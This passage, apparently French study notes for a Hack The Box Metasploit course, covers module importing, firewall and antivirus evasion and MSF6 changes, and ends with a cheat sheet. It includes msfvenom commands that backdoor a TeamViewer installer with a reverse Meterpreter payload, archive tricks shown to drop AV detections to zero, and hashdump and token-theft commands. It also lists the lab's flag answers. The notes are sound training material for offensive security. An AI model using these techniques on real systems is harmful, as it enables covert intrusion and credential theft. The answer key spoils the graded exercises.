✔️ **Plan B** si aucun module Metasploit n'existe pour la version précise détectée : chercher le PoC sur **searchsploit sudo**, l'exécuter manuellement depuis le shell existant (upload du binaire/script PoC via `upload` en Meterpreter, puis exécution directe), car toutes les variantes de Sudo n'ont pas de module MSF dédié.

**Partie 3 : lecture du flag**
7. ```bash
   find / -iname "flag.txt" 2>/dev/null
   cat /chemin/flag.txt
   ```

**Partie 4 : validation**
8. Saisis le contenu exact du flag → **Submit**.

---

# Page 11 — Writing and Importing Modules

## 📘 Résumé

### Mettre à jour vs installer un module isolé
- Mise à jour complète : `sudo apt update && sudo apt install metasploit-framework` (ou `apt upgrade`) pour récupérer tous les modules déjà portés sur la branche principale GitHub.
- Pour un module précis non inclus : recherche sur **ExploitDB**, filtrée par le tag **Metasploit Framework (MSF)**.

### ⌨️ searchsploit
```bash
searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"    # exclut les scripts non-Ruby
```
Les fichiers `.rb` sont (généralement) écrits pour tourner dans msfconsole — mais tous les `.rb` ne sont pas automatiquement compatibles module MSF (certains sont du Ruby « brut » sans code Metasploit).

### Installer un module téléchargé
```bash
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
msfconsole -m /usr/share/metasploit-framework/modules/
# ou, depuis msfconsole déjà ouvert :
loadpath /usr/share/metasploit-framework/modules/
# ou simplement :
reload_all
```
🔑 **Convention de nommage obligatoire** : snake_case, alphanumérique + underscores (jamais de tirets) : `nagios3_command_injection.rb`, `our_module_here.rb`.

### Structure des dossiers
```bash
ls /usr/share/metasploit-framework/      # dossier principal (data, lib, modules, msfconsole, …)
ls .msf4/                                 # symlinks dans le home (history, local, logs, modules, loot, store…)
```

### Porter un script externe en module Metasploit
1. Télécharger le script source (ex. ExploitDB `48746.rb`).
2. Le copier dans le bon sous-dossier de `modules/exploits/.../`.
3. Utiliser un module **existant et similaire** comme boilerplate (ex. un autre exploit Bludit déjà porté).
4. Adapter les **mixins** (`include`) selon les besoins réels (ex. retirer `Msf::Exploit::FileDropper` si le nettoyage de fichiers n'est pas requis).
5. Remplir la section `initialize` : `Name`, `Description`, `Author`, `References` (CVE, URL), `Platform`, `Arch`, `Notes` (`SideEffects`, `Reliability`, `Stability`), `Targets`, `DisclosureDate`.
6. Adapter `register_options` : types `OptString`, `OptPath`, etc., selon les paramètres réellement requis (login, mot de passe, wordlist…).
7. Adapter le code d'exploitation proprement dit (logique métier du PoC original, traduite en Ruby compatible Metasploit).

### Exemple de mixins et leur rôle
| Mixin | Rôle |
|---|---|
| `Msf::Exploit::Remote::HttpClient` | Client HTTP pour attaquer un serveur HTTP |
| `Msf::Exploit::PhpEXE` | Génère un payload PHP de 1er niveau |
| `Msf::Exploit::FileDropper` | Transfère des fichiers + nettoyage automatique après session |
| `Msf::Auxiliary::Report` | Rapporte des données à la base MSF |

## 🔑 À retenir
- `searchsploit -t <nom> --exclude=".py"` filtre vers les scripts probablement Ruby/MSF-compatibles.
- Nommage obligatoire en **snake_case** pour qu'un module importé soit reconnu.
- `reload_all` (ou `loadpath`) recharge les modules sans redémarrer msfconsole.
- Toujours réutiliser un module existant comme **boilerplate** plutôt que partir de zéro.

## ✅ Questions
Aucune question sur cette page.

---

# Page 12 — Firewall and IDS/IPS Evasion

## 📘 Résumé

### Deux formes de protection
| Protection | Description |
|---|---|
| **Endpoint protection** | Logiciel localisé sur un hôte unique (antivirus, antimalware, firewall, anti-DDoS) — ex. Avast, Nod32, Malwarebytes, BitDefender |
| **Perimeter protection** | Équipements physiques/virtualisés en bordure de réseau (séparation public/privé). Entre les deux : la **DMZ** (politique de sécurité intermédiaire, hôte des serveurs publics) |

### Security Policies (listes allow/deny)
Fonctionnent comme des **ACL** (Access Control Lists). Catégories : Network Traffic, Application, User Access Control, File Management, DDoS Protection Policies, etc.

### Méthodes de détection
| Méthode | Principe |
|---|---|
| **Signature-based Detection** | Comparaison à des motifs d'attaque préétablis (signatures). Correspondance exacte = alerte |
| **Heuristic / Statistical Anomaly Detection** | Comparaison comportementale à une baseline établie, inclut les signatures de modus operandi d'APT connus |
| **Stateful Protocol Analysis Detection** | Détecte les écarts par rapport à des profils préétablis de comportement non-malveillant |
| **Live-monitoring and Alerting (SOC-based)** | Analystes humains en SOC, surveillance en temps réel, décision humaine ou action automatisée |

### Techniques d'évasion

#### Chiffrement AES (MSF6)
Depuis MSF6, **tout le trafic Meterpreter est chiffré AES** de bout en bout — contourne en grande partie la détection réseau IDS/IPS basée sur les signatures de trafic en clair. **Ne résout pas** le filtrage par IP source (dans certains cas, seule la découverte d'un service légitime « laissé passer » par le pare-feu permet de contourner ce filtrage — ex. **le hack Equifax 2017**, exploitation d'Apache Struts + **exfiltration DNS** pendant des mois sans détection).

#### Templates exécutables (msfvenom)
```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```
- `-x` : exécutable **template** dans lequel injecter le payload (crée un **backdoored executable**).
- `-k` : déclenche la **poursuite de l'exécution normale** de l'application pendant que le payload tourne en thread séparé.
- ⚠️ Même avec `-k`, si la cible lance le binaire backdooré depuis un **CLI**, une fenêtre séparée du payload reste visible jusqu'à la fin de l'interaction.

#### Archives protégées par mot de passe
Contourne de nombreuses signatures AV, mais génère des **alertes « fichier non scannable »** côté AV (un admin peut inspecter manuellement).
```bash
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
rar a ~/test.rar -p ~/test.js              # archive + mot de passe
mv test.rar test                            # retire l'extension .rar
rar a test2.rar -p test                     # archive à nouveau (double archive)
mv test2.rar test2                          # retire l'extension une 2e fois
```
🔑 Résultat démontré dans le cours : un payload simple encodé (`test.js`) est détecté par **11/59** antivirus sur VirusTotal ; **doublement archivé et mot de passe protégé** (`test2`), il passe à **0/49** détections.

```bash
msf-virustotal -k <API_KEY> -f fichier     # analyse via l'API VirusTotal
```

#### Packers
Un **Packer** compresse l'exécutable + le code de décompression en un seul fichier, qui se restaure à l'exécution — ajoute une couche de protection contre le scan statique.

| Packers populaires |
|---|
| UPX, The Enigma Protector, MPRESS, Alternate EXE Packer, ExeStealth, Morphine, MEW, Themida |

Projet de référence pour approfondir : **PolyPack**.

#### Exploit coding
- Un **Buffer Overflow** peut être repéré par ses motifs hexadécimaux répétitifs — la **randomisation** (via un champ `Offset` dans le code du module) casse ces signatures.
- Éviter les **NOP sled** trop évidents (zone mémoire où atterrit le shellcode après l'overflow).
- Toujours tester en **environnement sandbox** avant un déploiement réel chez un client — souvent une seule tentative est possible en engagement réel.

## 🔑 À retenir
- Endpoint protection (hôte) vs Perimeter protection (bordure réseau) vs DMZ (zone intermédiaire).
- MSF6 = AES partout sur Meterpreter, mais ne résout pas le filtrage par IP.
- `-x` (template) + `-k` (continuation) + encodage + packer + double archivage = chaîne classique d'évasion.
- Une archive protégée par mot de passe échappe souvent au scan automatique mais déclenche un signal « non scannable ».

## ✅ Questions
Aucune question sur cette page.

---

# Page 13 — Metasploit-Framework Updates (August 2020)

## 📘 Résumé

### ⚠️ Rupture de compatibilité MSF5 → MSF6
Les **sessions de payload MSF5 deviennent inutilisables** sous MSF6, et les payloads générés sous MSF5 ne fonctionnent plus avec les mécanismes de communication MSF6.

### Nouveautés de génération
- **Chiffrement de bout en bout** sur toutes les sessions Meterpreter, pour les 5 implémentations (Windows, Python, Java, Mettle, PHP).
- Support du **client SMBv3**.
- Nouvelle routine de génération **polymorphe** pour le shellcode Windows (meilleure évasion AV/IDS).

### Chiffrement étendu
- Complexité accrue pour les signatures réseau et les binaires de payload principaux.
- **Tous** les payloads Meterpreter utilisent **AES** pour la communication attaquant ↔ cible.
- Intégration du chiffrement **SMBv3** = complexité accrue pour les signatures basées sur les opérations SMB.

### Artefacts de payload plus « propres »
- Les DLL du Meterpreter Windows résolvent désormais les fonctions nécessaires **par ordinal**, plus par nom.
- Le `ReflectiveLoader` standard n'apparaît plus en texte brut dans les binaires de payload.
- Les commandes exposées par Meterpreter au Framework sont encodées en **entiers** plutôt qu'en chaînes de caractères.

### Plugins
L'ancienne extension Meterpreter **Mimikatz** a été retirée au profit de sa remplaçante **Kiwi** — tenter de charger `mimikatz` charge désormais `kiwi`.

### Payloads
Remplacement de la routine de génération statique du shellcode par une **routine de randomisation**, ajoutant des propriétés polymorphes en mélangeant les instructions à chaque génération.

## 🔑 À retenir
- MSF5 et MSF6 sont **incompatibles** entre eux (sessions et payloads).
- Mimikatz (plugin) = toujours chargé sous le nom **Kiwi** désormais.
- AES partout sur Meterpreter + chiffrement SMBv3 depuis MSF6.

## ✅ Questions
Aucune question sur cette page.

---

# Mémo final — toutes les réponses HTB

| Page | Question | **Réponse à mettre sur HTB** |
|---|---|---|
| 1 | Version Metasploit avec GUI | `Metasploit Pro` |
| 1 | Commande d'interaction (version gratuite) | `msfconsole` |
| 2 à 3 | *(pas de question)* | — |
| 4 | Exploiter Apache Druid → flag.txt | `HTB{MSF_Expl01t4t10n}` |
| 5 | EternalRomance → flag Administrator | `HTB{MSF-W1nD0w5-3xPL01t4t10n}` |
| 6 à 9 | *(pas de question)* | — |
| 10 | Nom de l'application web (HTML) | `elFinder` |
| 10 | Utilisateur obtenu via exploit | `www-data` |
| 10 | Flag après privesc Sudo | `HTB{5e55ion5_4r3_sw33t}` |
| 11 à 13 | *(pas de question)* | — |

> ⚠️ Les réponses des pages 4, 5 et 10 proviennent des flags validés fournis. Les **chemins exacts des modules** utilisés (noms précis, ports) dépendent de la version réelle des services déployés sur ta cible — chaque procédure donne une méthode de recherche (`search <mot-clé>`) et un plan B pour les retrouver toi-même si le nom diffère.

---

# Cheat-sheet du module

## ⌨️ msfconsole — commandes de base
| Commande | Rôle |
|---|---|
| `msfconsole -q` | Démarre sans bannière |
| `search <mot-clé>` | Recherche de modules |
| `use <no.\|chemin>` | Sélectionne un module |
| `show options` | Affiche les paramètres requis |
| `show payloads` / `show targets` / `show encoders` | Liste les payloads/cibles/encodeurs compatibles |
| `set <param> <valeur>` | Définit un paramètre pour la session |
| `setg <param> <valeur>` | Définit un paramètre de façon persistante |
| `set payload <no.>` | Sélectionne un payload |
| `set target <no.>` | Sélectionne une cible précise |
| `info` | Détails du module (CVE, auteurs, description) |
| `run` / `exploit` | Lance le module |
| `exploit -j` | Lance en tâche de fond (job) |
| `check` | Vérifie si la cible est vulnérable sans exploiter |
| `grep <mot> show <commande>` | Filtre la sortie d'une commande (chaînable) |

## ⌨️ Sessions et jobs
```bash
sessions                 # liste
sessions -i <id>          # interagit
background                # bg (raccourci CTRL+Z)
jobs -l                    # liste des jobs
jobs -k <id>               # tue un job précis
jobs -K                    # tue tous les jobs
```

## ⌨️ Base de données
```bash
sudo msfdb init
sudo msfdb run
db_status
workspace -a NomCible
db_nmap -sV -p- IP
db_import scan.xml
db_export -f xml backup.xml
hosts / services / creds / loot / vulns / notes
```

## ⌨️ Meterpreter — essentiels
```bash
getuid                    # utilisateur courant (PAS whoami)
sysinfo                   # infos système
ps                         # liste les processus
steal_token <pid>          # vole un token plus privilégié
migrate <pid>              # migre vers un autre processus
hashdump                   # hash SAM
lsa_dump_sam / lsa_dump_secrets   # secrets LSA
shell                      # ouvre un vrai shell OS
search -f "nom*.ext"       # cherche un fichier
download / upload          # transfert de fichiers
background                 # passe en arrière-plan
```

## ⌨️ Post-exploitation : suggestion d'exploits locaux
```bash
background
search local_exploit_suggester
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

## ⌨️ msfvenom — génération de payloads
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f aspx > shell.aspx
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -k -x template.exe -e x86/shikata_ga_nai -a x86 --platform windows -o backdoored.exe -i 5
```

## ⌨️ Import de modules externes
```bash
searchsploit <nom>
searchsploit -t <nom> --exclude=".py"
cp fichier.rb /usr/share/metasploit-framework/modules/exploits/<os>/<service>/nom_en_snake_case.rb
reload_all
```

## 🔑 Repères rapides
| Sujet | À retenir |
|---|---|
| MSF5 ↔ MSF6 | Incompatibles (sessions et payloads) |
| Mimikatz | Chargé en tant que **Kiwi** depuis MSF6 |
| `getuid` | Équivalent Meterpreter de `whoami` |
| Endpoint vs Perimeter | Hôte unique vs bordure réseau (+ DMZ entre les deux) |
| `setg` vs `set` | Persistant pour la session msfconsole vs local au module actif |
| Reverse vs Bind | Reverse exploite la confiance du trafic sortant (pare-feu) |
